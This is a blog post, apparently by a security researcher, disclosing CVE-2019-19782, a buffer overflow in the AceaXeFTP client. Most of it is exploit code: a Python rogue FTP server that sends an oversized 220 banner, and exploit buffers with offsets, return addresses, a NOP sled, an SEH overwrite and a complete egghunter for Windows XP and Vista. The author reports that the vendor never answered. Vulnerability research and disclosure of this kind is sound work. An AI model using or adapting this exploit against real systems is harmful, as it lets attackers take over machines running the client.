---
layout: post
title: "RCE via Buffer Overflow - AceaXeFTP"
categories: CVE_Research
---

**RCE via Buffer Overflow - AceaXeFTP**{: style="color: greenyellow"}

# Summary:
It's Possible to trigger a buffer overflow, in AceaXeFTP client, by hosting a malicious ftp server and sending malicious responses to the client.

# Bin info:
Name: AceaXe +
Homepage: http://www.labf.com/aceaxeplus/index.html

# Proof of Concept (PoC):

Studying to take the OSCE exam, i was simply fascinated by the Exploit dev topic, ASLR Bypass and SEH based exploits, was something that i needed to see in the internet jungle.
&nbsp;

Doing the exercises, i was able to successfuly exploit one of the examples. So, i thought "Yeah, it's time to find a really old software that i could run in a windows vista and try to find some AAAA shenanigans", and that's what i did, got first a windows xp and windows vista vm running and the AceaXe software bundle installed.
&nbsp;

At first, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
&nbsp;

As i was researching i found a lot of PoCs of ftp clients that got exploited by sending the response of the ftp commands with the exploit code. so, after some hours of trying a lot of gui overflows and file sizes oveflows, I finnally tried creating my own fake FTP server in python and sending the famous EHLO response with a giant string &afterwords, and it worked, EIP was finnaly overwritten by the AAAAs ! 
&nbsp;

# Finnally ! Time to exploit (winXP version):

The concept was easy. Create a simple socket listening to port 21, that sends the string after the client connects to it.

&nbsp;
{% highlight python %}


port = 21                   
s = socket.socket()
host = '0.0.0.0'              
try:
	s.bind((host, port))            
	s.listen(5)                     
	print ('[+] Ouvindo na porta 21.')
except:
	print ('[-] Problemas no socket, veja se a porta 21 ja esta sendo utilizada')
while True:
 	try:
	    conn, addr = s.accept()
	    print ('[+] Envindo o payload')     
	    conn.send(dadosenviados)
	    conn.close()
	    print ('[+] Payload enviado com sucesso')
	except:
		print ('[-] Tivemos um prolema, veja se tudo foi settado corretamente')
		
{% endhighlight %}
&nbsp;

So, after Creating a FTP server I was able to send the malicious Buffer, to exploit this vulnerability. and after doing all the steps needed to create the simple buffer overflow i was able to retrieve a Command shell on the machine
&nbsp;
By sending the following payload, i was able to take control of the EIP 

&nbsp;
{% highlight python %}

jmpesp = "\x96\x72\x01\x68"
lixo = "\x41"*2061
nopsled = "\x90"*20
eip = '\x6F\x4A\x08\x68'

payload = lixo+eip+jmpesp+nopsled+shellcode+nopsled     

dadosenviados = '220'+payload+'\r\n'

{% endhighlight %}
&nbsp;

So, nothing new there, just a classic default buffer overflow, but i was so happy that i have found it haha. It was time to exploit it in windows vista, to smack some windows ASLRs. 
&nbsp;
I exploited it using a SEH based Buffer overflow, and by using the egghunter technique.
&nbsp;
the Code used to exploit it was:

&nbsp;
{% highlight python %}


lixo1 = "\x41"*100
lixo2 = "D" * (9266-len(shellcode))
lixo3 = "C" * 576
nopsled = "\x90"*20


egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

egg = "w00tw00t"

nseh = "\x90\x90\xEB\x05" 
seh = "\xF8\x54\x01\x68" #POP POP RET 680154F8 in WCMDPA10.DLL

payload = lixo1 + egg + nopsled + shellcode + lixo2 + nseh + seh + egghunter + lixo3


dadosenviados = '220'+payload+'\r\n'

{% endhighlight %}
&nbsp;
The vulnerability is, by this time (dez/2019), working. 
&nbsp;
I tried contact with the vendor, but didn\`t received any response.
&nbsp;
And there are several other vulnerabilities to exploit in this software, so if you guys want some study material. this one is recommended.
&nbsp;

#CVE

CVE-2019-19782

